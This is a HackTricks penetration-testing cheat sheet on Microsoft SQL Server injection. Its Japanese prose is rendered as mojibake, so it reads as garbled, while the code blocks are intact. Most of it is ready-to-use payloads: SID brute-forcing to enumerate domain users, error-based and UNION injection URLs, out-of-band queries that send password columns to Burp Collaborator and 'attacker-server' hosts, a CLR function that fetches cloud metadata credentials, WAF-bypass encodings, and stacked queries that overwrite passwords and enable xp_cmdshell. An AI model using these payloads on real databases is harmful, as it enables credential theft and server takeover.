# MSSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã®[**GitHubãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã‚„[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

## ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªåˆ—æŒ™

MSSQLã‚µãƒ¼ãƒãƒ¼å†…ã§SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’åˆ©ç”¨ã—ã¦**ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åˆ—æŒ™ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ä»¥ä¸‹ã®MSSQLé–¢æ•°ã‚’ä½¿ç”¨ã—ã¾ã™:

* **`SELECT DEFAULT_DOMAIN()`**: ç¾åœ¨ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’å–å¾—ã—ã¾ã™ã€‚
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: ãƒ‰ãƒ¡ã‚¤ãƒ³å(_DOMAIN_ ãŒã“ã®ä¾‹)ã‚’çŸ¥ã£ã¦ã„ã‚‹å ´åˆã€ã“ã®é–¢æ•°ã¯**ãƒ¦ãƒ¼ã‚¶ãƒ¼Administratorã®SID**ã‚’16é€²æ•°å½¢å¼ã§è¿”ã—ã¾ã™ã€‚ã“ã‚Œã¯ `0x01050000000[...]0000f401` ã®ã‚ˆã†ã«è¦‹ãˆã€**æœ€å¾Œã®4ãƒã‚¤ãƒˆ**ãŒ**500**ã¨ã„ã†**ãƒ“ãƒƒã‚°ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³**å½¢å¼ã®æ•°å€¤ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯**ä¸€èˆ¬çš„ãªãƒ¦ãƒ¼ã‚¶ãƒ¼administratorã®ID**ã§ã™ã€‚\
ã“ã®é–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ID**ï¼ˆæœ€å¾Œã®4ãƒã‚¤ãƒˆã‚’é™¤ãã™ã¹ã¦ã®ãƒã‚¤ãƒˆï¼‰ã‚’çŸ¥ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : ã“ã®é–¢æ•°ã¯ã€æŒ‡å®šã•ã‚ŒãŸ**IDã®ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã‚’è¿”ã—ã¾ã™ï¼ˆå­˜åœ¨ã™ã‚‹å ´åˆï¼‰ã€‚ã“ã®å ´åˆã€**0000e803** ã¯ãƒ“ãƒƒã‚°ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³ã§**1000**ã«ãªã‚Šã¾ã™ï¼ˆé€šå¸¸ã€ã“ã‚Œã¯æœ€åˆã«ä½œæˆã•ã‚ŒãŸé€šå¸¸ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã§ã™ï¼‰ã€‚ãã®å¾Œã€1000ã‹ã‚‰2000ã¾ã§ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã¦ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ã™ã¹ã¦å–å¾—ã™ã‚‹ã“ã¨ãŒæƒ³åƒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€æ¬¡ã®ã‚ˆã†ãªé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **ä»£æ›¿ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®ãƒ™ã‚¯ãƒˆãƒ«**

ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯é€šå¸¸ã€`+AND+1=@@version--` ã®ã‚ˆã†ãªæ§‹é€ ã‚„ã€ã€ŒORã€æ¼”ç®—å­ã«åŸºã¥ãå¤‰ç¨®ã§è¦‹ã‚‰ã‚Œã¾ã™ã€‚ã“ã®ã‚ˆã†ãªè¡¨ç¾ã‚’å«ã‚€ã‚¯ã‚¨ãƒªã¯ã€é€šå¸¸WAFã«ã‚ˆã£ã¦ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã™ã€‚ãƒã‚¤ãƒ‘ã‚¹ã¨ã—ã¦ã€æ±‚ã‚ã‚‰ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ã«ãƒ‡ãƒ¼ã‚¿å‹å¤‰æ›ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™ç‰¹å®šã®é–¢æ•°å‘¼ã³å‡ºã—ã®çµæœã¨ã€%2bæ–‡å­—ã‚’ä½¿ç”¨ã—ã¦æ–‡å­—åˆ—ã‚’é€£çµã—ã¾ã™ã€‚

ãã®ã‚ˆã†ãªé–¢æ•°ã®ä¾‹:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

é–¢æ•° `USER_NAME()` ã®ä½¿ç”¨ä¾‹ï¼š
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
## SSRF

### `fn_xe_file_target_read_file`
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**æ¨©é™:** ã‚µãƒ¼ãƒãƒ¼ã§ **`VIEW SERVER STATE`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**æ¨©é™:** **`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettable`
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**æ¨©é™:** **`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

MSSQLã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚³ãƒ¼ãƒ«ã‚’è¡Œã†æœ€ã‚‚ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯ã€Microsoftã«ã‚ˆã£ã¦æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ãªã„ä¸æ€è­°ãªã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ `xp_dirtree` ã®ä½¿ç”¨ã§ã™ã€‚ã“ã‚ŒãŒåŸå› ã§ã€[ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®ä»–ã®äººã€…ã«ã‚ˆã£ã¦æ–‡æ›¸åŒ–ã•ã‚Œã¾ã—ãŸ](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/)ã€‚ã“ã®æ–¹æ³•ã¯ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®[Out of Band Data exfiltration](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)ã«é–¢ã™ã‚‹[è¤‡æ•°ã®ä¾‹](https://www.notsosecure.com/oob-exploitation-cheatsheet/)ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚

æœ¬è³ªçš„ã«ã€
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
MySQLã®`LOAD_FILE`ã®ã‚ˆã†ã«ã€`xp_dirtree`ã‚’ä½¿ç”¨ã—ã¦**TCPãƒãƒ¼ãƒˆ445ã®ã¿**ã«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒãƒ¼ãƒˆç•ªå·ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ãŒã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å…±æœ‰ã‹ã‚‰æƒ…å ±ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**PSï¼š** ã“ã‚Œã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®è¨­å®šã§`Windows Server 2016 Datacenter`ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`ã§ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚

**ä»–ã«ã‚‚**ã€åŒæ§˜ã®çµæœã‚’å¾—ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°[**`master..xp_fileexist`**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx)ã‚„**`xp_subdirs`**ãªã©ã§ã™ã€‚

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

æ˜ã‚‰ã‹ã«ã€**`xp_cmdshell`**ã‚’ä½¿ç”¨ã—ã¦**å®Ÿè¡Œ**ã—ã€**SSRF**ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ä½•ã‹ã‚’è¡Œã†ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€ãƒšãƒ¼ã‚¸å†…ã®**é–¢é€£ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’èª­ã‚“ã§ãã ã•ã„**ï¼š

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL ãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©é–¢æ•° - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

**CLR UDF**ï¼ˆCommon Language Runtime User Defined Function - **.NET**è¨€èªã®ã„ãšã‚Œã‹ã§æ›¸ã‹ã‚Œã€**DLL**ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ï¼‰ã‚’æ›¸ãã€MSSQLå†…ã§ã‚«ã‚¹ã‚¿ãƒ é–¢æ•°ã¨ã—ã¦**ãƒ­ãƒ¼ãƒ‰ã™ã‚‹**ã®ã¯æ¯”è¼ƒçš„ç°¡å˜ã§ã™ã€‚ãŸã ã—ã€ã“ã‚Œã«ã¯`dbo`ã‚¢ã‚¯ã‚»ã‚¹ãŒ**å¿…è¦ã§ã™**ã®ã§ã€webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«**`sa`ã¾ãŸã¯ç®¡ç†è€…ãƒ­ãƒ¼ãƒ«ã¨ã—ã¦**æ¥ç¶šã—ã¦ã„ãªã„é™ã‚Šã€æ©Ÿèƒ½ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

[ã“ã®Githubãƒªãƒã‚¸ãƒˆãƒªã«ã¯ã€Visual Studioãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¨MSSQLã«CLRã‚¢ã‚»ãƒ³ãƒ–ãƒªã¨ã—ã¦ãƒã‚¤ãƒŠãƒªã‚’ãƒ­ãƒ¼ãƒ‰ã—ã€MSSQLå†…ã‹ã‚‰HTTP GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ãŒã‚ã‚Šã¾ã™](https://github.com/infiniteloopltd/SQLHttp)ã€‚

`http.cs`ã‚³ãƒ¼ãƒ‰ã¯`WebClient`ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã—ã¦GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã€æŒ‡å®šã•ã‚ŒãŸå†…å®¹ã‚’ãƒ•ã‚§ãƒƒãƒã—ã¾ã™ã€‚
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ã§ã¯ã€`CREATE ASSEMBLY` ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã™ã‚‹å‰ã«ä»¥ä¸‹ã‚’å®Ÿè¡Œã—ã€ã‚¢ã‚»ãƒ³ãƒ–ãƒªã®SHA512ãƒãƒƒã‚·ãƒ¥ã‚’ã‚µãƒ¼ãƒãƒ¼ä¸Šã®ä¿¡é ¼ã•ã‚ŒãŸã‚¢ã‚»ãƒ³ãƒ–ãƒªã®ãƒªã‚¹ãƒˆã«è¿½åŠ ã—ã¾ã™ï¼ˆãƒªã‚¹ãƒˆã¯ `select * from sys.trusted_assemblies;` ã‚’ä½¿ç”¨ã—ã¦ç¢ºèªã§ãã¾ã™ï¼‰ã€‚
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
ã‚¢ã‚»ãƒ³ãƒ–ãƒªãŒè¿½åŠ ã•ã‚Œã€é–¢æ•°ãŒä½œæˆã•ã‚ŒãŸã‚‰ã€ä»¥ä¸‹ã‚’å®Ÿè¡Œã—ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
## **ã‚¯ã‚¤ãƒƒã‚¯ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ: ä¸€ã¤ã®ã‚¯ã‚¨ãƒªã§ãƒ†ãƒ¼ãƒ–ãƒ«å…¨ä½“ã‚’å–å¾—**

ãƒ†ãƒ¼ãƒ–ãƒ«ã®å†…å®¹ã‚’ä¸€ã¤ã®ã‚¯ã‚¨ãƒªã§å–å¾—ã™ã‚‹ã«ã¯ã€FOR XMLå¥ã¾ãŸã¯FOR JSONå¥ã‚’ä½¿ç”¨ã™ã‚‹2ã¤ã®ç°¡å˜ãªæ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚FOR XMLå¥ã¯ã€Œrawã€ãªã©ã®æŒ‡å®šã•ã‚ŒãŸãƒ¢ãƒ¼ãƒ‰ã‚’å¿…è¦ã¨ã™ã‚‹ãŸã‚ã€ç°¡æ½”ã•ã®ç‚¹ã§FOR JSONãŒå„ªã‚Œã¦ã„ã¾ã™ã€‚

ç¾åœ¨ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã‚¹ã‚­ãƒ¼ãƒã€ãƒ†ãƒ¼ãƒ–ãƒ«ã€ã‚«ãƒ©ãƒ ã‚’å–å¾—ã™ã‚‹ã‚¯ã‚¨ãƒª:
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®ãƒ™ã‚¯ã‚¿ãƒ¼ã¯ã€ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã¾ãŸã¯åå‰ãŒå¿…è¦ã§ã™ã€‚ãªãœãªã‚‰ã€ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã‚„åå‰ãŒãªã„è¡¨ç¾ã®å‡ºåŠ›ã¯JSONã¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã§ããªã„ã‹ã‚‰ã§ã™ã€‚
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **ç¾åœ¨å®Ÿè¡Œä¸­ã®ã‚¯ã‚¨ãƒªã®å–å¾—**

å®Ÿè¡Œä¸­ã®SQLã‚¯ã‚¨ãƒªã¯ã€`sys.dm_exec_requests` ã¨ `sys.dm_exec_sql_text` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦å–å¾—ã§ãã¾ã™ï¼š
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
**æ¨©é™:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦VIEW SERVER STATEæ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯SQL Serverã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ä¸Šã§å®Ÿè¡Œä¸­ã®ã™ã¹ã¦ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã§ãã¾ã™ã€‚ãã†ã§ãªã„å ´åˆã¯ã€ç¾åœ¨ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ã¿ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **WAFãƒã‚¤ãƒ‘ã‚¹ã®ãŸã‚ã®å°æŠ€**

éæ¨™æº–ã®ç©ºç™½æ–‡å­—: %C2%85 ã¾ãŸã¯ %C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
ç§‘å­¦çš„ï¼ˆ0eï¼‰ãŠã‚ˆã³16é€²æ•°ï¼ˆ0xï¼‰è¡¨è¨˜ã«ã‚ˆã‚‹UNIONã®é›£èª­åŒ–ï¼š
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
FROMã¨åˆ—åã®é–“ã«ç©ºç™½ã®ä»£ã‚ã‚Šã«ãƒ”ãƒªã‚ªãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ï¼š
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
SELECTã¨ä½¿ã„æ¨ã¦åˆ—ã®é–“ã®\Nã‚»ãƒ‘ãƒ¬ãƒ¼ã‚¿ï¼š
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### WAFãƒã‚¤ãƒ‘ã‚¹ã¨éæ­£çµ±çš„ãªã‚¹ã‚¿ãƒƒã‚¯ã‚¯ã‚¨ãƒª

[**ã“ã®ãƒ–ãƒ­ã‚°æŠ•ç¨¿**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)ã«ã‚ˆã‚‹ã¨ã€";"ã‚’ä½¿ç”¨ã›ãšã«MSSQLã§ã‚¯ã‚¨ãƒªã‚’ã‚¹ã‚¿ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

ä¾‹ãˆã°ã€è¤‡æ•°ã®ã‚¯ã‚¨ãƒªã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
ç°¡æ½”ã«ã™ã‚‹ã¨ï¼š
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
ã—ãŸãŒã£ã¦ã€ã“ã®å½¢å¼ã®ã‚¯ã‚¨ãƒªã®ã‚¹ã‚¿ãƒƒã‚­ãƒ³ã‚°ã‚’è€ƒæ…®ã—ã¦ã„ãªã„ç•°ãªã‚‹WAFã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ä¾‹ãˆã°ï¼š
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## å‚è€ƒæ–‡çŒ®

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
